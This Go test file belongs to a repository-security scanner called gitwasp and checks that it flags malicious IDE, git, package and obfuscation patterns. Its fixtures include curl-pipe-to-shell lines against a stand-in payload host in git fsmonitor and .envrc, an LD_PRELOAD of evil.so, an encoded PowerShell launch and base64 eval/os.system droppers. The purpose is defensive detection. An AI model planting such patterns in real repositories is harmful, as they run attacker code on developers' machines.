package scanner_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Jehudavd/gitwasp/internal/model"
	"github.com/Jehudavd/gitwasp/internal/scanner"
	"github.com/Jehudavd/gitwasp/internal/source"
)

func TestSafeRepoHasZeroFindings(t *testing.T) {
	safeDir := filepath.Join("..", "..", "testdata", "safe-repo")
	files, _, err := source.CollectLocal(safeDir)
	if err != nil {
		t.Fatalf("CollectLocal(%s): %v", safeDir, err)
	}
	if len(files) == 0 {
		t.Fatalf("expected target files in %s, got 0", safeDir)
	}

	res := scanner.Scan(safeDir, "local", files, 0)
	if res.Verdict != model.VerdictSafe {
		t.Fatalf("expected SAFE verdict, got %s with findings: %+v", res.Verdict, res.Findings)
	}
	if len(res.Findings) != 0 {
		t.Fatalf("expected 0 findings on safe-repo, got %d: %+v", len(res.Findings), res.Findings)
	}
}

func TestMaliciousRepoDetectsAllFixtureRules(t *testing.T) {
	malDir := filepath.Join("..", "..", "testdata", "malicious-repo")
	files, _, err := source.CollectLocal(malDir)
	if err != nil {
		t.Fatalf("CollectLocal(%s): %v", malDir, err)
	}

	res := scanner.Scan(malDir, "local", files, 0)
	if res.Verdict != model.VerdictDanger {
		t.Fatalf("expected DANGER verdict, got %s", res.Verdict)
	}

	seen := make(map[string]bool)
	for _, f := range res.Findings {
		seen[f.RuleID] = true
	}

	expectedRules := []string{
		"IDE-001",
		"AI-001",
		"AI-002",
		"AI-003",
		"AI-004",
		"PKG-001",
		"PKG-002",
		"GIT-001",
		"GIT-002",
		"OBF-001",
		"OBF-002",
		"OBF-003",
	}
	for _, ruleID := range expectedRules {
		if !seen[ruleID] {
			t.Errorf("expected rule %s to trigger on malicious-repo, got rules: %+v", ruleID, res.Findings)
		}
	}
}

func TestIDERulesIDE002AndIDE003(t *testing.T) {
	files := []model.FileEntry{
		{
			Path: ".vscode/launch.json",
			Content: []byte(`{
  // comment
  "configurations": [
    {
      "name": "Debug",
      "runtimeExecutable": "powershell",
      "args": ["-enc", "aW1wb3J0"]
    }
  ]
}`),
		},
		{
			Path: ".vscode/settings.json",
			Content: []byte(`{
  "python.defaultInterpreterPath": "./scripts/fake-python.sh",
  "terminal.integrated.env.linux": {
    "LD_PRELOAD": "./evil.so"
  },
  "task.allowAutomaticTasks": "on",
  "security.workspace.trust.enabled": false
}`),
		},
	}

	res := scanner.Scan("synthetic", "local", files, 0)
	counts := map[string]int{}
	for _, f := range res.Findings {
		counts[f.RuleID]++
	}
	if counts["IDE-002"] != 1 {
		t.Fatalf("expected 1 IDE-002 finding, got %d (%+v)", counts["IDE-002"], res.Findings)
	}
	if counts["IDE-003"] != 4 {
		t.Fatalf("expected 4 IDE-003 findings, got %d (%+v)", counts["IDE-003"], res.Findings)
	}
}

func TestGitConfigAndPkgEnvrcSetupPy(t *testing.T) {
	files := []model.FileEntry{
		{
			Path: ".git/config",
			Content: []byte(`[core]
	repositoryformatversion = 0
	filemode = true
	fsmonitor = curl https://payload.example.invalid/m | sh
	sshCommand = ./scripts/ssh-wrap.sh
	hooksPath = .githooks
[remote "origin"]
	url = https://github.com/Jehudavd/gitwasp.git
`),
		},
		{
			Path:    ".envrc",
			Content: []byte("export PATH=./bin:$PATH\ncurl -s https://payload.example.invalid/env | sh\n"),
		},
		{
			Path: "setup.py",
			Content: []byte(`import os, base64
os.system(base64.b64decode("ZWNobyBkZW1v").decode())
`),
		},
		{
			Path:    "scripts/dropper.js",
			Content: []byte(`eval(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString())`),
		},
	}

	res := scanner.Scan("synthetic", "local", files, 0)
	counts := map[string]int{}
	for _, f := range res.Findings {
		counts[f.RuleID]++
	}
	if counts["GIT-003"] != 3 {
		t.Errorf("expected 3 GIT-003 findings, got %d (%+v)", counts["GIT-003"], res.Findings)
	}
	if counts["PKG-003"] < 2 {
		t.Errorf("expected >=2 PKG-003 findings (.envrc + setup.py), got %d (%+v)", counts["PKG-003"], res.Findings)
	}
	if counts["OBF-003"] != 1 {
		t.Errorf("expected 1 OBF-003 finding, got %d (%+v)", counts["OBF-003"], res.Findings)
	}
}

func TestCleanGitConfigHasNoFindings(t *testing.T) {
	files := []model.FileEntry{
		{
			Path: ".git/config",
			Content: []byte(`[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
[remote "origin"]
	url = https://github.com/Jehudavd/gitwasp.git
`),
		},
	}
	res := scanner.Scan("clean-git", "local", files, 0)
	if len(res.Findings) != 0 {
		t.Fatalf("expected 0 findings for standard .git/config, got %+v", res.Findings)
	}
}

func TestSanitizeSnippetNeutralizesANSIAndBiDi(t *testing.T) {
	raw := "\x1b[31mSPOOF\x1b[0m \u202ealert\u200b"
	got := scanner.SanitizeSnippet(raw, 100)
	if strings.ContainsRune(got, 0x1B) {
		t.Fatalf("ANSI escape byte survived sanitization: %q", got)
	}
	if strings.ContainsRune(got, '\u202e') || strings.ContainsRune(got, '\u200b') {
		t.Fatalf("hidden unicode rune survived sanitization: %q", got)
	}
	if !strings.Contains(got, "[ESC]") || !strings.Contains(got, "[U+202E]") || !strings.Contains(got, "[U+200B]") {
		t.Fatalf("expected escaped markers in sanitized snippet, got %q", got)
	}
}

func TestCollectLocalSkipsBinaryOversizedAndSymlinks(t *testing.T) {
	tmp := t.TempDir()

	// Normal file
	if err := os.WriteFile(filepath.Join(tmp, "package.json"), []byte(`{"name":"ok"}`), 0o644); err != nil {
		t.Fatal(err)
	}

	// Binary .js file containing NUL byte
	if err := os.WriteFile(filepath.Join(tmp, "binary.js"), []byte{0x00, 0x01, 0x02, 'a'}, 0o644); err != nil {
		t.Fatal(err)
	}

	// Oversized .sh file (> 512 KiB)
	big := make([]byte, source.MaxFileSize+10)
	for i := range big {
		big[i] = '#'
	}
	if err := os.WriteFile(filepath.Join(tmp, "big.sh"), big, 0o644); err != nil {
		t.Fatal(err)
	}

	files, skipped, err := source.CollectLocal(tmp)
	if err != nil {
		t.Fatalf("CollectLocal: %v", err)
	}
	if len(files) != 1 || files[0].Path != "package.json" {
		t.Fatalf("expected only package.json, got %+v", files)
	}
	if skipped != 2 {
		t.Fatalf("expected 2 skipped files (binary + oversized), got %d", skipped)
	}
}

func TestCollectLocalNeverFollowsSymlinks(t *testing.T) {
	tmp := t.TempDir()
	outside := t.TempDir()

	secretTarget := filepath.Join(outside, "evil.sh")
	if err := os.WriteFile(secretTarget, []byte("curl https://payload.example.invalid/x | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	linkPath := filepath.Join(tmp, "link.sh")
	if err := os.Symlink(secretTarget, linkPath); err != nil {
		t.Skipf("skipping symlink test (privilege not available on this OS): %v", err)
	}

	files, skipped, err := source.CollectLocal(tmp)
	if err != nil {
		t.Fatalf("CollectLocal: %v", err)
	}
	if len(files) != 0 {
		t.Fatalf("expected symlinked file not to be collected, got %+v", files)
	}
	if skipped < 1 {
		t.Fatalf("expected symlink to increment skipped count, got %d", skipped)
	}
}
